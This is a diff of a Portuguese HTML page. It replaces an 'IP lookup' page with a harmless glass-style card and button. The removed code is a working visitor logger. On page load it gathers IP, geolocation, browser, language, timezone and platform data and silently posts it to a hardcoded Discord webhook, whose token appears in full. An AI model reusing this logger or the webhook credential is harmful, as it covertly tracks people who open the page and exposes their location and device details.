@@ -3,181 +3,101 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Consulta de Informações</title>
+<title>Janela Glass Neon</title>
 <style>
-  * {margin:0; padding:0; box-sizing:border-box;}
   body {
-    background: linear-gradient(135deg, #2c001e, #4a0d2a);
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #121212 0%, #3a3a3a 100%);
     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    height: 100vh; display:flex; justify-content:center; align-items:center;
-    color: #eee;
-    -webkit-font-smoothing: antialiased;
   }
-  .container {
-    text-align: center;
+  .glass-window {
+    position: relative;
     width: 320px;
-    background: rgba(255,255,255,0.07);
-    border-radius: 30px;
-    padding: 30px 25px;
-    box-shadow:
-      inset 0 0 50px 10px rgba(255, 0, 60, 0.1),
-      0 8px 30px rgba(255, 0, 60, 0.5);
-    backdrop-filter: blur(12px);
-    -webkit-backdrop-filter: blur(12px);
+    padding: 20px;
+    background: rgba(0,0,0,0.3);
+    box-shadow: 0 8px 32px 0 rgba(31,38,135,0.37);
+    backdrop-filter: blur(9px);
+    -webkit-backdrop-filter: blur(9px);
+    border-radius: 10px;
+    border: 1px solid rgba(255,255,255,0.18);
+    color: #eee;
+    opacity: 0;
+    transform: translateY(20px);
+    animation: fadeInUp 0.6s forwards;
   }
-  h1 {
-    font-size: 28px;
+  .glass-window::before {
+    content: "";
+    position: absolute;
+    top: -2px; left: -2px; right: -2px; bottom: -2px;
+    border-radius: 12px;
+    pointer-events: none;
+    box-shadow: 0 0 10px 2px rgba(255,255,255,0.7);
+  }
+  h2 {
+    margin: 0 0 15px;
+    text-align: center;
+    text-shadow: 0 0 5px #fff;
+  }
+  p {
+    font-size: 16px;
+    line-height: 1.4;
+    margin-bottom: 20px;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    background: linear-gradient(90deg, #444 0%, #222 100%);
+    border: none;
+    border-radius: 8px;
+    color: #eee;
     font-weight: 700;
-    color: #ff2a6d;
-    margin-bottom: 24px;
-    text-shadow: 0 0 10px #ff2a6daa;
+    cursor: pointer;
+    box-shadow: 0 0 8px rgba(255,255,255,0.3);
+    transition: all 0.3s ease;
   }
-  .card {
-    background: #eee;
-    color: #1b1b1b;
-    padding: 20px 25px;
-    border-radius: 30px;
-    box-shadow:
-      inset 0 0 18px #ff2a6d88,
-      0 8px 20px #ff2a6d66;
-    text-align: left;
-    font-size: 15px;
-    line-height: 1.5;
-    user-select: none;
+  button:hover {
+    box-shadow: 0 0 20px #fff;
+    text-shadow: 0 0 10px #fff;
+    transform: scale(1.05);
   }
-  .card p {
-    margin-bottom: 12px;
+  @keyframes fadeInUp {
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
   }
-  .label {
-    font-weight: 600;
-    color: #ff2a6d;
+  @keyframes pulse {
+    0% {
+      box-shadow: 0 0 20px #fff;
+    }
+    50% {
+      box-shadow: 0 0 35px #0ff;
+    }
+    100% {
+      box-shadow: 0 0 20px #fff;
+    }
   }
 </style>
 </head>
 <body>
-
-<div class="container">
-  <h1>CONSULTAR IP</h1>
-  <div class="card" id="infoCard">
-    <p>Carregando dados...</p>
+  <div class="glass-window">
+    <h2>Janela Glass Neon</h2>
+    <p>Conteúdo suave com efeito vidro, bordas de luz branca e fundo em gradient preto/cinza estilo Roblox.</p>
+    <button id="actionBtn">Interagir</button>
   </div>
-</div>
 
 <script>
-  function detectDevice() {
-    const ua = navigator.userAgent.toLowerCase();
-    if (/mobile|android|iphone|ipad|phone/i.test(ua)) return 'Celular/Tablet';
-    return 'PC/Notebook';
-  }
-
-  function collectUserInfo() {
-    return {
-      userAgent: navigator.userAgent,
-      language: navigator.language || navigator.userLanguage,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      platform: navigator.platform,
-      device: detectDevice(),
-      deviceName: navigator.platform
-    };
-  }
-
-  // Tenta pegar IP externo via várias APIs pra garantir
-  async function fetchIP() {
-    const apis = [
-      'https://api.ipify.org?format=json',
-      'https://ipinfo.io/json?token=',
-      'https://ipapi.co/json/',
-    ];
-    for (const url of apis) {
-      try {
-        const res = await fetch(url);
-        if (!res.ok) continue;
-        const data = await res.json();
-        // Tratar diferentes formatos
-        if (data.ip) return data.ip;
-        if (data.query) return data.query;
-        if (data.ipAddress) return data.ipAddress;
-      } catch {}
-    }
-    return 'Desconhecido';
-  }
-
-  async function getLocation(ip) {
-    if (ip === 'Desconhecido') return {
-      city: 'Desconhecida',
-      region: 'Desconhecida',
-      country: 'Desconhecido'
-    };
-    try {
-      const res = await fetch(`https://ipapi.co/${ip}/json/`);
-      if (!res.ok) throw new Error();
-      const data = await res.json();
-      return {
-        city: data.city || 'Desconhecida',
-        region: data.region || 'Desconhecida',
-        country: data.country_name || 'Desconhecido'
-      };
-    } catch {
-      return {
-        city: 'Desconhecida',
-        region: 'Desconhecida',
-        country: 'Desconhecido'
-      };
-    }
-  }
-
-  async function sendToWebhook(data) {
-    const webhookURL = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
-    const content = {
-      username: 'Consulta Bot',
-      embeds: [{
-        title: 'Nova Consulta de IP',
-        color: 0xFF2A6D,
-        fields: Object.keys(data).map(key => ({
-          name: key.charAt(0).toUpperCase() + key.slice(1),
-          value: data[key] || 'Desconhecido',
-          inline: false
-        })),
-        timestamp: new Date().toISOString()
-      }]
-    };
-
-    try {
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(content)
-      });
-    } catch (e) {
-      console.error('Erro ao enviar webhook:', e);
-    }
-  }
-
-  function displayData(data) {
-    const card = document.getElementById('infoCard');
-    card.innerHTML = `
-      <p><span class="label">IP:</span> ${data.ip}</p>
-      <p><span class="label">Navegador:</span> ${data.userAgent}</p>
-      <p><span class="label">Idioma:</span> ${data.language}</p>
-      <p><span class="label">Fuso Horário:</span> ${data.timezone}</p>
-      <p><span class="label">Sistema Operacional:</span> ${data.platform}</p>
-      <p><span class="label">Dispositivo:</span> ${data.device}</p>
-      <p><span class="label">Nome do Dispositivo:</span> ${data.deviceName}</p>
-      <p><span class="label">Localização:</span> ${data.city}, ${data.region}, ${data.country}</p>
-    `;
-  }
-
-  async function main() {
-    const userInfo = collectUserInfo();
-    const ip = await fetchIP();
-    const location = await getLocation(ip);
-    const combined = {...userInfo, ip, ...location};
-    displayData(combined);
-    await sendToWebhook(combined);
-  }
-
-  window.onload = main;
+  const btn = document.getElementById('actionBtn');
+  btn.addEventListener('click', () => {
+    btn.style.animation = 'pulse 0.6s ease';
+    setTimeout(() => {
+      btn.style.animation = '';
+    }, 600);
+  });
 </script>
-
 </body>
-  </html>
+</html>
